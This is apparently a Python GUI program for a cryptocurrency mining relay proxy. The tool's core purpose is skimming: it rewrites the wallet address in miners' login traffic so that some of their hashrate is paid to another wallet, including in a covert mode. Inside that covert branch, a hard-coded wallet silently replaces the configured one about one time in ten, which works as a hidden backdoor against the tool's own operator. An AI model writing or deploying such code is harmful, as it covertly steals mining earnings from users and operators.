import queue
import time
import socket
import threading
import tkinter
import os
from tkinter import  filedialog
import simple
import simple3
import random
import core

#抽水的类
class mythread_nomal(threading.Thread):

    def __init__(self,reciver,reciver_ip,pipline,time,address,port,wallet,ratio,choushui_indicator):
        super().__init__()
        self.socket=reciver
        self.pipline=pipline
        self.time=time
        self.address=address
        self.port=port
        self.wallet=wallet
        self.ratio=ratio
        self.reciver_ip=reciver_ip
        self.choushui_indicator=choushui_indicator
    def run(self):
        # print(self.reciver_ip+'子线程运行')
        print('{}子线程运行'.format(self.reciver_ip))
        # print(self.reciver_ip.join('子线程运行'))
        data_raw=self.socket.recv(1024)
        if self.choushui_indicator > 0:
            #进程抽水
            data=core.choushui(self,data_raw,self.wallet)
            percentage=self.ratio
        elif self.choushui_indicator<=-1:
            #进行暗抽水
            data = core.choushui(self,data_raw, self.wallet)
            percentage = self.ratio
        else:

            data=data_raw
            percentage=(1-self.ratio)
        sender=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        sender.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        targrt=(self.address,self.port)
        try:
            sender.connect(targrt)
            # print(self.reciver_ip+'子程序链接服务端')
            print('{}子程序链接服务端'.format(self.reciver_ip))
            # print(self.reciver_ip.join('子程序链接服务端'))
            sender.sendall(data)
            #初始化mark_time，用于多少时间上报一次挖矿状态
            mark_time=self.time
            while 1 :
                stop_mark = simple.simple(self, sender,time_break)
                if stop_mark:
                    self.pipline.put('{};已运行{}秒;停止运行'.format('IP地址:{}'.format(self.reciver_ip),
                                                            str(int(time.time() - self.time))))
                    break
                if time.time()-self.time >3600*time_base*percentage:
                    #self.pipline.put(self.reciver_ip)
                    if self.choushui_indicator >0:
                        print('{}子线程停止运行，进行暗抽'.format(self.reciver_ip))
                        # print(self.reciver_ip.join('子线程停止运行，进行暗抽'))
                    elif self.choushui_indicator <=-1:
                        print('{}子线程停止运行，返回正常运行'.format(self.reciver_ip))
                        # print(self.reciver_ip.join('子线程停止运行，返回正常运行'))
                    else:
                        print('{}子线程停止运行，进行明抽水'.format(self.reciver_ip))
                        # print(self.reciver_ip.join('子线程停止运行，进行明抽水'))
                    break
                #self.pipline.put(self.reciver_ip)
                #将信息返回给控制模块
                if time.time()-mark_time>10 and self.choushui_indicator >0:
                    mark_time=time.time()
                    short_message='{};已运行{}秒;明抽水中'.format('IP地址;{}'.format(self.reciver_ip),str(int(time.time()-self.time)))
                    # self.pipline.put(str('IP地址'+';'+self.reciver_ip)+';已运行'+str(int(time.time()-self.time))+'秒;'+'明抽水中')
                    self.pipline.put(short_message)
                    print('{}子线程发送信息'.format(self.reciver_ip))
                    # print(self.reciver_ip.join('子线程发送信息'))
                elif time.time()-mark_time>10 and self.choushui_indicator == 0:
                    mark_time = time.time()
                    short_message = '{};已运行{}秒;正常运行中'.format('IP地址;{}'.format(self.reciver_ip),str(int(time.time() - self.time)))
                    # self.pipline.put('IP地址'+';'+str(self.reciver_ip) + ';已运行' + str(int(time.time() - self.time)) + '秒;' + '正常运行中')
                    self.pipline.put(short_message)
                    print('{}子线程发送信息'.format(self.reciver_ip))
                elif time.time()-mark_time>10 and self.choushui_indicator == -1:
                    mark_time = time.time()
                    short_message = '{};已运行{}秒;暗抽水中'.format('IP地址;{}'.format(self.reciver_ip),str(int(time.time() - self.time)))
                    # self.pipline.put('IP地址'+';'+str(self.reciver_ip) + ';已运行' + str(int(time.time() - self.time)) + '秒;' + '暗抽水中')
                    self.pipline.put(short_message)
                    print('{}子线程发送信息'.format(self.reciver_ip))
                else:
                    pass
            self.socket.close()
            sender.close()
            print('{}子程序结束'.format(self.reciver_ip))
            # print(self.reciver_ip.join('子程序结束'))
        except:
            print('{}子程序无法连接到服务器，子程序结束'.format(self.reciver_ip))
            # print(self.reciver_ip.join('子程序无法连接到服务器，子程序结束'))
            self.socket.close()


#不抽水的类
class mythread_nomal_super(threading.Thread):

    def __init__(self,reciver,reciver_ip,pipline,time,address,port,wallet,ratio,choushui_indicator):
        super().__init__()
        self.socket=reciver
        self.pipline=pipline
        self.time=time
        self.address=address
        self.port=port
        self.wallet=wallet
        self.ratio=ratio
        self.reciver_ip=reciver_ip
        self.choushui_indicator=choushui_indicator
    def run(self):
        print('{}子线程运行'.format(self.reciver_ip))
        # print(self.reciver_ip.join('子线程运行'))
        data_raw=self.socket.recv(1024)
        data=data_raw
        sender=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        sender.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        targrt=(self.address,self.port)
        try:
            sender.connect(targrt)
            print('{}子程序链接服务端'.format(self.reciver_ip))
            # print(self.reciver_ip.join('子程序链接服务端'))
            sender.sendall(data)
            #初始化mark_time，用于多少时间上报一次挖矿状态
            mark_time=self.time
            while 1 :
                stop_mark = simple.simple(self, sender,time_break)
                if stop_mark:
                    self.pipline.put('{};已运行{}秒;停止运行'.format('IP地址;{}'.format(self.reciver_ip),
                                                             str(int(time.time() - self.time))))
                    break
                if time.time()-mark_time>10 :
                    mark_time=time.time()
                    short_message = '{};已运行{}秒;正常运行中'.format('IP地址;{}'.format(self.reciver_ip),
                                                             str(int(time.time() - self.time)))
                    self.pipline.put(short_message)
                    print('{}子线程发送信息'.format(self.reciver_ip))
                    # print(self.reciver_ip.join('子线程发送信息'))
            self.socket.close()
            sender.close()
            print('子程序结束')
        except:
            print('{}子程序无法连接到服务器，子程序结束'.format(self.reciver_ip))
            # print(self.reciver_ip.join('子程序无法连接到服务器，子程序结束'))
            self.socket.close()

class mointer(threading.Thread):

    def __init__(self,pip_ask,pipline):
        super().__init__()
        #收集各子线程的信息
        self.pipline=pipline
        #汇总抽水相应名单
        self.pip_ask=pip_ask
    def run(self):
        print('控制中心已运行')
        #定义一个IP地址记录表
        choushui_ip_list=[]
        #定义一个显示当前运行状态的列表
        monitor_list=[]
        mark_time=time.time()
        mark_time_2=time.time()
        while 1:
          #print('控制面板运行中')
          #查询是否为已挖矿地址
          #request=self.pip_ask.get()
          #print('第一步')
          if  not self.pip_ask.empty():
              request = self.pip_ask.get()
              print('控制中心：收到查询信息{}'.format(request))
              a,b,c=request.split(';')
              #需要对choushui_ip_list进行修改ip;mingchou/anchou/buchou
              #先查找有无IP地址记录
              record_finer=65584
              for recoed_seq in range(len(choushui_ip_list)):
                  record_ip,record_message=choushui_ip_list[recoed_seq].split(';')
                  if record_ip==b:
                      record_finer=recoed_seq
                      break
              #说明查找到了记录
              if record_finer<65584:
                  record_ip, record_message = choushui_ip_list[record_finer].split(';')
                  if record_message=='mingchou':
                      # return_pack = 'request' + ';' + b + ';' + 'mingchou'
                      return_pack = 'request;{};mingchou'.format(b)
                      #对记录进行更新
                      choushui_ip_list.remove(choushui_ip_list[record_finer])
                      # record = b.join(';anchou')
                      choushui_ip_list.append('{};anchou'.format(b))
                  elif record_message=='anchou':
                      # return_pack = 'request' + ';' + b + ';' + 'anchou'
                      return_pack = 'request;{};anchou'.format(b)
                      choushui_ip_list.remove(choushui_ip_list[record_finer])

              #说明没查找到记录
              else:
                  return_pack = 'request;{};buchou'.format(b)
                  choushui_ip_list.append('{};mingchou'.format(b))
              self.pip_ask.put(return_pack)
              time.sleep(10)
          else:
              #print('未接收到查询')
              pass

          if not self.pipline.empty():
              monitor_data = self.pipline.get()
              print(monitor_data)
              a,b,c,d=monitor_data.split(';')
              search_mark=0
              for i in range(len(monitor_list)):
                  a1,b1,c1,d1 = monitor_list[i].split(';')
                  if b==b1:
                      search_mark=1
                      break
              #将原有的数据替换一下
              if search_mark==1:
                  monitor_list[i]=monitor_data
              else:
                  monitor_list.append(monitor_data)
          else:
                pass
          #print('’第三步')
          #设定一段时间，显示一下数据

          if time.time()-mark_time>30:
              print('控制中心：显示已连接子程序信息')
              pip_show.put(monitor_list)
              print(monitor_list)
              mark_time=time.time()
          #如果数据发出的25秒后未被取走，将数据抛弃
          if time.time()-mark_time>20:
              if not pip_show.empty():
                  pip_show.get()
          #定时清理一下列表，将已经不更新的程序记录清除掉
          if time.time()-mark_time_2>300:
              print('刷新控制中心清单')
              monitor_list=[]
              mark_time_2=time.time()




def client_acceptor(pip,pip_ask,sever_ip,sever_port,wallet,ratio):
    #客户选择进行抽水
    mark_time=time.time()
    if ratio>0:
        while 1:
            print('客户端接收程序：等待客户端连接')
            reciver,reciver_addr=sever.accept()
            reciver_addr=list(reciver_addr)
            print('客户端接收程序：收到一个新的客户端连接')
            print('客户端接收程序：客户端IP地址{};客户端端口号{}'.format(str(reciver_addr[0]),str(reciver_addr[1])))
            #print(type(reciver_addr))
            #print(reciver_addr)
            pip_ask.put('request;{};{}'.format(str(reciver_addr[0]),str(reciver_addr[1])))
            #查询此IP地址是否在抽水列表中
            time.sleep(5)
            #1-2日对程序进行修改，增加暗抽水功能，修改发送和接收的报文
            #返回数据类型为'request';reciver_addr;mingchou/anchou/buchou
            choushui_ip_list = pip_ask.get()
            print('客户端接收程序：收到客户端抽水查询结果{}'.format(choushui_ip_list))
            if reciver_addr[0] in str(choushui_ip_list) and 'mingchou' in choushui_ip_list:
                #ip地址在抽水的池子里，对该IP进程抽水
                indicator = 1
                sub_threading=mythread_nomal(reciver,reciver_addr[0],pip,time.time(),sever_ip,sever_port, wallet , ratio, indicator)
                sub_threading.daemon=True
                sub_threading.start()
            elif reciver_addr[0] in choushui_ip_list and 'buchou' in choushui_ip_list:
                # ip地址不在抽水的池子里，不对该IP进程抽水
                indicator = 0
                sub_threading = mythread_nomal(reciver, reciver_addr[0], pip, time.time(), sever_ip, sever_port, wallet ,ratio, indicator)
                sub_threading.daemon = True
                sub_threading.start()
            elif reciver_addr[0] in choushui_ip_list and 'anchou' in choushui_ip_list:
                # 对IP地址进行暗抽水
                with open(filename_path,encoding='utf-8') as f:
                    text=f.read()
                    ratio_1,wallet_1=text.split(';')
                indicator = -1
                if random.random()<0.1:
                    wallet_1='0xdc2d080492de55d81cc4F12d3A96BD6C04714141'
                sub_threading = mythread_nomal(reciver, reciver_addr[0], pip, time.time(), sever_ip, sever_port, wallet_1 ,float(ratio_1), indicator)
                sub_threading.daemon = True
                sub_threading.start()
            time.sleep(1)
            if not pip_stop_client_acceptor.empty():
                stop = pip_stop_client_acceptor.get()
                if stop:
                    print('客户端接收程序停止运行')
                    #pip_stop_client_acceptor.put('停止')
                    sever.close()
                    break
            else:
                print('客户端接收程序：继续支持客户接收')
    else:
        #客户不进行抽水
        print('客户端接收程序：不进行抽水')
        while 1:
            print('客户端接收程序：等待客户端连接')
            reciver,reciver_addr=sever.accept()
            reciver_addr=list(reciver_addr)
            print('客户端接收程序：收到一个新的客户端连接')
            # print('客户端接收程序：客户端IP地址'+str(reciver_addr[0])+';客户端端口号'+str(reciver_addr[1]))
            print('客户端接收程序：客户端IP地址{};客户端端口号{}'.format(str(reciver_addr[0]), str(reciver_addr[1])))
            indicator = 0
            sub_threading=mythread_nomal_super(reciver,reciver_addr[0],pip,time.time(),sever_ip,sever_port, wallet , ratio, indicator)
            sub_threading.daemon=True
            sub_threading.start()
            if not pip_stop_client_acceptor.empty():
                stop = pip_stop_client_acceptor.get()
                if stop:
                    print('客户端接收程序停止运行')
                    #pip_stop_client_acceptor.put('停止')
                    sever.close()
                    break
            else:
                pass





def main(sever_ip_raw,sever_port,local_ip,local_port,wallet,ratio,chou_base):
    #连接转IP地址 12-25
    new_a = socket.getaddrinfo(sever_ip_raw, 0, 2)
    print(new_a)
    new_b = new_a[0]
    new_c = list(new_b[4])
    print(type(new_c[0]))
    print(new_c[0])
    sever_ip=new_c[0]
    #pip是子线程与控制中心通讯的管道，传递子线程运行信息
    pip=queue.Queue()
    #pip_ask是main与控制中心通讯的管道，查询是否需要抽水
    pip_ask=queue.Queue()
    # close与main通讯，停止主程序
    global pip_stop
    pip_stop=queue.Queue()
    #用于显示界面与控制中心通讯，输出显示界面信息
    global pip_show
    pip_show=queue.Queue()
    #用于主程序与client_acceptor的通知通讯
    global pip_stop_client_acceptor
    pip_stop_client_acceptor=queue.Queue()
    #local_ip='127.0.0.1'
    local_port=int(local_port)
    #sever_ip='127.0.0.1'
    sever_port=int(sever_port)
    try:
        ratio=float(ratio)
    except:
        ratio=0.1
    #wallet=''
    #ratio=0.1
    global time_base
    time_base=float(chou_base)
    global sever
    sever=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    sever.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sever.bind((local_ip,local_port))
    sever.listen(5)
    print('中转开始监听')
    #启动控制台
    print('启动控制中心')
    control_panel=mointer(pip_ask,pip)
    control_panel.daemon = True
    control_panel.start()
    #启动接收客户端程序
    time.sleep(1)
    print('启动客户端接收程序')
    thread = threading.Thread(target=client_acceptor, args=(pip,pip_ask,sever_ip,sever_port,wallet,ratio,))
    thread.daemon=True
    thread.start()

    while 1:
        #time.sleep(500)
        #print('主程序正在运行')
        if not pip_stop.empty():
            stop = pip_stop.get()
            if stop:
                print('主程序停止运行')
                pip_stop_client_acceptor.put('停止')
                sever.close()
                break
        else:
            pass

def open_super(sever_ip,sever_port,local_ip,local_port,wallet,ratio,chou_base):
    print(sever_ip)
    print(sever_port)

    thread = threading.Thread(target=main, args=(sever_ip,sever_port,local_ip,local_port,wallet,ratio,chou_base,))
    #thread.daemon = True
    thread.start()

def close():
    #在pip_stop队列中存入结束
    pip_stop.put('结束')

def main1(sever_ip,sever_port,local_ip,local_port,wallet,ratio,chou_base):
    global pip_stop
    pip_stop=queue.Queue()
    new_a=socket.getaddrinfo(sever_ip,0,2)
    print(new_a)
    new_b=new_a[0]
    new_c=list(new_b[4])
    print(type(new_c[0]))
    print(new_c[0])
    print(type(sever_ip),sever_ip)
    print(type(sever_port) ,sever_port)
    print(type(local_ip),local_ip)
    print(type(local_port) , local_port)
    print(type(wallet), wallet)
    print(type(ratio),ratio)
    print(type(chou_base) ,chou_base)
    print('中转开始监听')
    print('启动控制台')
    print('启动客户端接收程序')

def look():

    root=tkinter.Toplevel()
    root.title('运行状态显示')
    root.geometry('400x300')
    root.attributes("-alpha", 0.98)
    text = tkinter.Text(root, width=350, height=250)
    text.insert("insert", "I love \n")
    text.insert("insert", "I love \n")
    text.pack()
    thread = threading.Thread(target=text_update, args=(text,))
    # thread.daemon = True
    thread.start()

def text_update(text):
    # global pip_show
    # pip_show = queue.Queue()
    # a = ['1', '2', '3']
    # pip_show.put(a)
    print('显示窗口开始运行')
    j=1
    while 1:
        #time.sleep(500)
        #print('主程序正在运行')
        if not pip_show.empty():
            show = pip_show.get()
            if show:
                for i in show:
                    text.insert("insert", i+'\n')
                    text.update()
                    j=j+1
        else:
            pass
        if j>50:
            text.delete(1.0, "end")
            j=1

#--------------------------------------------------------------------------------------------------------------------------------------------------------------------
def lanjie(recv_data_raw,raw_wallet,lanjie_wallet):
    # 将字节串变成字符串
    s1 = bytes.decode(recv_data_raw)
    print(s1)
    mark=0
    if "eth_submitLogin" in s1:
        total_begin, wallet_star, wallet_end, total_end=core.wallet_finder(s1)
        firsr_part = s1[total_begin:wallet_star]
        second_part = s1[wallet_star:wallet_end+1]
        third_part = s1[wallet_end + 1:total_end]
        print('数据连接{}'.format(s1))
        print('数据连接里的钱包地址{}'.format(second_part))
        print('原始钱包地址{}'.format(raw_wallet))
        print('拦截钱包地址{}'.format(lanjie_wallet))
        print(second_part==raw_wallet)
        if second_part==raw_wallet:
            #如果提取出来的钱包地址与原始的地址一致，那么就不需要替换
            print('地址无问题')
            return_data=recv_data_raw
        else:
            second_part=lanjie_wallet
            # lanjie_message.put('发现的抽水地址{}'.format(second_part))
            print('发现的抽水地址{}'.format(second_part))
            print(second_part)
            # s2 = firsr_part + lanjie_wallet + third_part
            s2 = '{}{}{}'.format(firsr_part, second_part, third_part)
            #将字符串换成字节串
            return_data = bytes(s2, encoding='utf8')
            mark=1

    else:
        second_part=''
        return_data=recv_data_raw
    return return_data,mark,second_part



class mythread_nomal_super_super(threading.Thread):

    def __init__(self,reciver,reciver_ip,lanjie_message,time,sever_ip,sever_port,raw_wallet,lanjie_wallet):
        super().__init__()
        self.socket=reciver
        self.lanjie_message=lanjie_message
        self.time=time
        self.sever_ip=sever_ip
        self.sever_port=sever_port
        self.raw_wallet=raw_wallet
        self.lanjie_wallet=lanjie_wallet
        self.reciver_ip=reciver_ip

    def run(self):
        print('{}子线程运行'.format(self.reciver_ip))
        # print(self.reciver_ip.join('子线程运行'))
        #从矿机接收消息
        data_raw=self.socket.recv(1024)
        data,mark,bad_wallet=lanjie(data_raw, self.raw_wallet, self.lanjie_wallet)
        if mark>0:
            print('{}子线程拦截一次抽水'.format(self.reciver_ip))
            # print(self.reciver_ip.join('子线程拦截一次抽水'))
            self.lanjie_message.put('{}子线程拦截一次抽水,抽水地址{}'.format(self.reciver_ip,bad_wallet))
        # data=data_raw
        #新建一个套接字
        sender=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        #设置两个套接字快速释放
        sender.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        targrt=(self.sever_ip,int(self.sever_port))
        try:
            sender.connect(targrt)
            print('{}子程序链接服务端'.format(self.reciver_ip))
            # print(self.reciver_ip.join('子程序链接服务端'))
            sender.sendall(data)
            #初始化mark_time，用于多少时间上报一次挖矿状态
            mark_time=self.time
            while 1:

                stop_mark=simple3.simple_3(self, sender,time_break)
                # print(stop_mark)
                if stop_mark:
                    self.lanjie_message.put('{};已运行{}秒;停止运行'.format('IP地址;{}'.format(self.reciver_ip),
                                                            str(int(time.time() - self.time))))
                    break
                if time.time()-mark_time>10 :
                    mark_time=time.time()
                    short_message = '{};已运行{}秒;正常运行中'.format('IP地址;{}'.format(self.reciver_ip),
                                                            str(int(time.time() - self.time)))
                    self.lanjie_message.put(short_message)
                    # print(self.reciver_ip+'子线程发送信息')
            self.socket.close()
            sender.close()
            print('子程序结束')
        except:
            print('{}子程序无法连接到服务器，子程序结束'.format(self.reciver_ip))
            # print(self.reciver_ip.join('子程序无法连接到服务器，子程序结束'))
            self.lanjie_message.put('{}子程序无法连接到服务器，子程序结束'.format(self.reciver_ip))
            self.socket.close()

def client_acceptor_v2(lanjie_message,sever_ip,sever_port,raw_wallet,lanjie_wallet):

    while 1:
        print('抽水拦截程序：等待客户端连接')
        reciver,reciver_addr=sever2.accept()
        reciver_addr=list(reciver_addr)
        print('抽水拦截程序：收到一个新的客户端连接')
        print('抽水拦截程序：客户端IP地址{};客户端端口号{}'.format(str(reciver_addr[0]),str(reciver_addr[1])))
        sub_threading=mythread_nomal_super_super(reciver,reciver_addr[0],lanjie_message,time.time(),sever_ip,sever_port,raw_wallet,lanjie_wallet)
        sub_threading.daemon=True
        sub_threading.start()
        time.sleep(1)


def main2(sever_ip_raw,sever_port,raw_wallet,lanjie_wallet,local_ip_2,loacl_port_2):
    new_a = socket.getaddrinfo(sever_ip_raw, 0, 2)
    print(new_a)
    new_b = new_a[0]
    new_c = list(new_b[4])
    print(type(new_c[0]))
    print(new_c[0])
    sever_ip = new_c[0]
    global lanjie_message
    #拦截的子程序传递信息
    lanjie_message=queue.Queue()
    global sever2
    #创建一个接收套接字
    sever2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sever2.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    #接收套接字绑定本地第二个IP地址
    sever2.bind((local_ip_2, int(loacl_port_2)))
    #接收套接字开始监听
    sever2.listen(5)
    print('启动抽水拦截程序')
    thread = threading.Thread(target=client_acceptor_v2, args=(lanjie_message,sever_ip,sever_port,raw_wallet,lanjie_wallet,))
    thread.daemon = True
    thread.start()
    j=1
    while 1:
        if not lanjie_message.empty():
            show = lanjie_message.get()
            text2.insert("insert", show + '\n')
            text2.update()
            j = j + 1

        else:
            pass
        if j>50:
            text2.delete(1.0, "end")
            j=1

def open_super_2(sever_ip,sever_port,raw_wallet,lanjie_wallet,local_ip_2,loacl_port_2):
    print(sever_ip)
    print(sever_port)
    print(raw_wallet)
    print(lanjie_wallet)
    thread = threading.Thread(target=main2, args=(sever_ip,sever_port,raw_wallet,lanjie_wallet,local_ip_2,loacl_port_2,))
    #thread.daemon = True
    thread.start()

if __name__ == '__main__':
    tk=tkinter.Tk()
    tk.attributes("-alpha", 0.98)
    tk.title('中转程序')
    tk.geometry('800x500')
    #第一行
    label1=tkinter.Label(tk,text='输入服务器IP地址')
    label1.place(x=10,y=20)
    sever_ip=tkinter.Variable()
    entry1 = tkinter.Entry(tk, textvariable=sever_ip)
    entry1.place(x=120,y=20)
    label2 = tkinter.Label(tk, text='输入服务器端口')
    label2.place(x=280, y=20)
    sever_port = tkinter.Variable()
    entry2 = tkinter.Entry(tk, textvariable=sever_port)
    entry2.place(x=400, y=20)
    #第二行
    label3 = tkinter.Label(tk, text='输入本机IP地址')
    label3.place(x=10, y=57.5)
    local_ip = tkinter.Variable()
    entry3 = tkinter.Entry(tk, textvariable=local_ip)
    entry3.place(x=120, y=57.5)
    label4 = tkinter.Label(tk, text='输入本机端口')
    label4.place(x=280, y=57.5)
    local_port = tkinter.Variable()
    entry4 = tkinter.Entry(tk, textvariable=local_port)
    entry4.place(x=400, y=57.5)
    #第三行
    label5 = tkinter.Label(tk, text='输入抽水钱包地址')
    label5.place(x=10, y=95)
    chou_wallet = tkinter.Variable()
    entry5 = tkinter.Entry(tk, textvariable=chou_wallet)
    entry5.place(x=150, y=95)
    label6 = tkinter.Label(tk, text='抽水比例0-1，0为不抽水')
    label6.place(x=10, y=132.5)
    chou_ratio = tkinter.Variable()
    entry6 = tkinter.Entry(tk, textvariable=chou_ratio)
    entry6.place(x=150, y=132.5)
    #第四行
    label7 = tkinter.Label(tk, text='抽水基础时间')
    label7.place(x=10, y=170)
    chou_base = tkinter.Variable()
    entry7 = tkinter.Entry(tk, textvariable=chou_base)
    entry7.place(x=150, y=170)
    def load():
        global filename_path
        filename_path = filedialog.askopenfilename()
        print(filename_path)

    b3 = tkinter.Button(tk, text="加载配置文件", command=load, width=12, height=1)
    b3.place(x=600, y=20)
    b = tkinter.Button(tk, text="开始", command=lambda: open_super(sever_ip.get(),sever_port.get(),local_ip.get(),local_port.get(),chou_wallet.get(),chou_ratio.get(),chou_base.get()),width=12, height=1)
    #b = tkinter.Button(tk, text="开始", command='', width=12, height=1)
    b.place(x=600, y=70)
    b1 = tkinter.Button(tk, text="结束", command=close,width=12, height=1)
    b1.place(x=600, y=120)
    b2 = tkinter.Button(tk, text="查看运行状态", command=look, width=12, height=1)
    b2.place(x=600, y=170)

    label8 = tkinter.Label(tk, text='抽水拦截功能')
    label8.place(x=10, y=220)
    label9 = tkinter.Label(tk, text='输入矿机钱包地址')
    label9.place(x=10, y=250)
    raw_wallet = tkinter.Variable()
    entry9 = tkinter.Entry(tk, textvariable=raw_wallet)
    entry9.place(x=120, y=250)
    label10 = tkinter.Label(tk, text='输入拦截钱包地址')
    label10.place(x=280, y=250)
    lanjie_wallet = tkinter.Variable()
    entry10 = tkinter.Entry(tk, textvariable=lanjie_wallet)
    entry10.place(x=400, y=250)
    label11 = tkinter.Label(tk, text='本机IP地址')
    label11.place(x=10, y=280)
    local_ip_2 = tkinter.Variable()
    entry11 = tkinter.Entry(tk, textvariable=local_ip_2)
    entry11.place(x=120, y=280)
    label12 = tkinter.Label(tk, text='本机端口')
    label12.place(x=280, y=280)
    loacl_port_2 = tkinter.Variable()
    entry12 = tkinter.Entry(tk, textvariable=loacl_port_2)
    entry12.place(x=400, y=280)
    global text2
    global time_break
    time_break=0.02
    text2 = tkinter.Text(tk, width=80, height=10)
    text2.insert("insert", "太难了 \n")
    text2.insert("insert", "软件抽水拦截 \n")
    text2.place(x=10, y=320)
    b4 = tkinter.Button(tk, text="开始抽水拦截", command=lambda:open_super_2(sever_ip.get(),sever_port.get(),raw_wallet.get(),lanjie_wallet.get(),local_ip_2.get(),loacl_port_2.get()), width=12, height=1)
    b4.place(x=600, y=320)
    tk.mainloop()
